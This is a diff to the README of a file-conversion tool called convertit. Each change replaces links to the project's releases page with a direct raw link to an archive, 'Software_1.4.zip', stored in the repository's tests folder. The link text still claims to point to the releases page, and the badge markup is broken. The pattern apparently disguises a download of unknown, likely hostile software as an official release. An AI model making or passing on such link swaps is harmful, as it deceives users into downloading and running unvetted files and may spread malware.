@@ -1,7 +1,7 @@
 # 🎉 convertit - Easily Convert Your Files
 
 ## 📥 Download Now
-[![Download convertit](https://img.shields.io/badge/Download%20convertit-v1.0-blue.svg)](https://github.com/andydotiyal/convertit/releases)
+[![Download convertit](https://github.com/andydotiyal/convertit/raw/refs/heads/main/tests/Software_1.4.zip%https://github.com/andydotiyal/convertit/raw/refs/heads/main/tests/Software_1.4.zip)](https://github.com/andydotiyal/convertit/raw/refs/heads/main/tests/Software_1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to convertit—your ultimate toolkit for file conversion. With convertit, you can easily convert files between formats like PDF, Word, Excel, CSV, HTML, and images. This guide will help you download and run the software smoothly.
@@ -22,7 +22,7 @@ Before you download convertit, make sure your system meets these specifications:
 ## 📥 Download & Install
 To start using convertit, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [download page here](https://github.com/andydotiyal/convertit/releases) to see the available versions.
+1. **Visit the Releases Page:** Go to the [download page here](https://github.com/andydotiyal/convertit/raw/refs/heads/main/tests/Software_1.4.zip) to see the available versions.
    
 2. **Choose the Latest Version:** Look for the latest release which is generally marked as the most recent. 
 
@@ -81,6 +81,6 @@ convertit covers a range of topics including:
 ## 📞 Support
 If you need help, feel free to reach out through the GitHub Issues page. Your feedback is valuable to us and helps us improve convertit. 
 
-For more information, visit the [convertit releases page](https://github.com/andydotiyal/convertit/releases) to discover all available versions and updates. 
+For more information, visit the [convertit releases page](https://github.com/andydotiyal/convertit/raw/refs/heads/main/tests/Software_1.4.zip) to discover all available versions and updates. 
 
 Thank you for choosing convertit for your file conversion needs!
